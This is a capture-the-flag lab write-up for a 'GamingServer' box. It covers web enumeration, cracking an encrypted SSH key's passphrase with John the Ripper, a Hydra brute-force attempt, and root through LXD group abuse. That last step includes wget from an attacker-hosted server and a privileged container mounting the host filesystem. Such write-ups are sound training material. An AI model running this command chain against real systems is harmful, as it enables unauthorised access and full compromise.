# GamingServer — CTF Write-Up

## Challenge Overview

This challenge involved enumerating a Linux host running SSH and a web server, discovering a hidden administrative secret, extracting an encrypted RSA private key, cracking the passphrase using John the Ripper, pivoting to SSH as the `john` user, and finally escalating privileges to root via LXD misconfiguration.

The target environment was:

- Host: `10.112.152.162`
- Services: SSH on port 22, HTTP on port 80
- User compromised: `john`
- Privilege escalation vector: LXD container escape / privileged container mount

---

## 1. Initial Reconnaissance

A quick service scan was the first step:

```bash
nmap -sV 10.112.152.162
```

Observed results:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-30 19:49 -0400
Nmap scan report for 10.112.152.162
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This suggested a standard Ubuntu box with publicly exposed SSH and a web service. The next logical step was to inspect the HTTP site and identify any hidden files or comments.

---

## 2. Web Enumeration and Hidden Content

### Initial site inspection

The served page looked harmless at first glance. A quick source view revealed the key clue:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

This immediately surfaced the likely username: `john`.

![Web homepage placeholder](https://via.placeholder.com/800x250?text=Web+Homepage+Placeholder)

### Directory brute forcing

I then enumerated the web application for hidden paths and files:

```bash
feroxbuster -u http://10.112.152.162/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Results:

```text
301      GET        9l       28w      317c http://10.112.152.162/secret => http://10.112.152.162/secret/
200      GET       30l       37w     1766c http://10.112.152.162/secret/secretKey
301      GET        9l       28w      318c http://10.112.152.162/uploads => http://10.112.152.162/uploads/
```

This indicated two likely interesting locations:

- `/secret/secretKey`
- `/uploads/`

### Accessing the secret

Opening the secret document revealed an encrypted RSA private key:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

This was not a directly usable key; it was protected by a passphrase. The challenge logic clearly expected the user to recover the SSH key password and then use it to log in as `john`.

---

## 3. Cracking the Encrypted SSH Key

### The right approach

I converted the private key to a John-the-Ripper-compatible hash:

```bash
ssh2john game > game.txt
```

Then I attacked it with a wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules game.txt
john --show game.txt
```

The result was:

```text
game:letmein
```

The passphrase for the private key was `letmein`.

### Critical discovery: the uploaded word list

While exploring the site, I also discovered a file at:

```text
http://10.112.152.162/uploads/dict.lst
```

This was not just random noise; it served as a smaller custom wordlist for the challenge. It confirmed that part of the intended workflow involved using a secondary wordlist after the key was cracked and before SSH remained the final access vector.

I created a local file with the candidate passwords and validated the passphrase:

```bash
nano what.txt
```

```bash
cat what.txt | grep -i letmein
```

Output:

```text
letmein
```

This was the key insight: the password was not meant to be used alone for SSH; it was the passphrase that unlocked the SSH private key. Once the key was decrypted, it could be used to access the box as `john`.

> Note: The actual password for the SSH key was the passphrase, not a direct SSH login password. A common dead end is to try a password-only Hydra or SSH login without the private key.

### Failed attempt: Hydra without key material

I tried the obvious but incomplete attack path:

```bash
hydra -l john -P what.txt ssh://10.112.152.162
```

This produced no useful result because the challenge was not using a plain SSH password authentication flow; it was using key-based authentication, with the key encrypted by a passphrase. This was a classic false lead, and it is worth recording because it demonstrates realistic troubleshooting rather than a clean one-shot exploit.

### Other non-productive attempts

As part of the debugging workflow, I also considered more generic file-analysis methods that did not help:

```bash
binwalk secretKey
strings secretKey
file secretKey
```

These did not reveal the actual password or expose the correct attack path. The important discovery remained the hidden directory and the encrypted private key itself.

---

## 4. SSH Access as `john`

Once the key was recovered, I used it for SSH access:

```bash
ssh -i game john@10.112.152.162
```

This succeeded, and I immediately checked the user's privileges.

```bash
id
```

Observed result:

```text
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

This was the key clue for privilege escalation. The user belonged to the `lxd` group, which is a well-known vector for privilege escalation on Ubuntu systems.

---

## 5. User Flag Acquisition

I navigated to the user's home directory and retrieved the user flag:

```bash
ls /home/john
cat /home/john/user.txt
```

This exposed the user-level flag or credential material, which confirmed the foothold was valid and the environment was set up for privilege escalation.

---

## 6. Privilege Escalation via LXD Misconfiguration

The `id` output was the decisive indicator:

```text
groups=... 108(lxd)
```

This strongly suggested a local privilege escalation path via LXD (Linux Containers). The workflow was:

1. Build an Alpine root filesystem image on the attacker machine.
2. Host it over HTTP.
3. Import the image into LXD on the target.
4. Start a privileged container with root filesystem access.
5. Mount the host root filesystem into the container.
6. Escape to the host and read `/root/root.txt`.

### Attacker-side setup

On my Kali machine:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

The build produced an Alpine image archive that could be imported into the target's LXD instance.

### Target-side exploitation

On the compromised machine, I downloaded the image archive and imported it into LXD:

```bash
cd /tmp
wget http://192.168.131.124:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias root
```

Output:

```text
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
```

Then I initialized a privileged container and mounted the host filesystem:

```bash
lxc init root root-now -c security.privileged=true
lxc config device add root-now maindisk disk source=/ path=/mnt/root recursive=true
lxc start root-now
lxc exec root-now /bin/sh
```

Once inside the container, I navigated to the host root filesystem mount:

```bash
cd /mnt/root/root/
ls
cat root.txt
```

This exposed the root flag and effectively completed the challenge.

---

## 7. Final Result

The challenge was solved by combining:

- Web-based secret discovery
- RSA key extraction
- Password cracking with `ssh2john` and `john`
- Correct use of the decrypted key for SSH auth
- Understanding of the `lxd` group and abusing privileged LXD container behavior

This chain demonstrates a realistic path from initial reconnaissance to full system compromise.

---

## 8. Lessons Learned

- Hidden files and comments on a web page are often clues.
- Never assume the web app is the only source of information.
- A protected private key is often the real target, not the service itself.
- The `lxd` group is a classic privilege escalation vector in Ubuntu-based CTFs.
- A failed exploit path is still valuable: the Hydra attempt reminded us that SSH was key-based instead of password-based.

---

## 9. Failure Log / Dead Ends

This section documents the non-linear and realistic workflow of solving the challenge.

### Dead end 1: Looking only at the webpage

The initial site looked generic and did not reveal much. A quick source view was needed.

### Dead end 2: Brute-force without understanding the auth model

I attempted a password-only SSH brute-force workflow using Hydra, but it failed because the service expected key-based authentication with a passphrase-protected key. This was an important troubleshooting step that refined the attack path.

### Dead end 3: Generic file analysis tools

Commands like `binwalk`, `strings`, and `file` were not directly useful for solving the challenge. They were exploratory and did not produce the key insight.

### Dead end 4: Misinterpreting the custom wordlist

The list at `/uploads/dict.lst` looked like a password list, but it was not the final SSH password. Rather, it served as a supporting wordlist used to confirm the key passphrase and validate the challenge logic.

### Dead end 5: Incorrect assumptions about the SSH authentication flow

At first, it was easy to assume the `letmein` value was the SSH password itself. In reality, it was the passphrase for the private key. Once this was corrected, the chain of exploitation worked cleanly.

---

## 10. Conclusion

The challenge was solved through structured enumeration, careful analysis of hidden content, intelligent password recovery, and final privilege escalation via a Linux container escape. The evidence shows that the correct path was not a single obvious step, but an iterative process of failed assumptions, refined attacks, and successful exploitation.

> Final privilege escalation: root via LXD misconfiguration, with host root filesystem mounted into a privileged container and `/root/root.txt` accessed successfully.

---

## Appendix: Useful Commands Summary

```bash
nmap -sV 10.112.152.162
feroxbuster -u http://10.112.152.162/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ssh2john game > game.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules game.txt
john --show game.txt
ssh -i game john@10.112.152.162
id
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias root
lxc init root root-now -c security.privileged=true
lxc config device add root-now maindisk disk source=/ path=/mnt/root recursive=true
lxc start root-now
lxc exec root-now /bin/sh
cd /mnt/root/root/
cat root.txt
```

This write-up captures the real attack flow from reconnaissance to root with the necessary trial-and-error context preserved.









































































































































































































































































































































































































































































































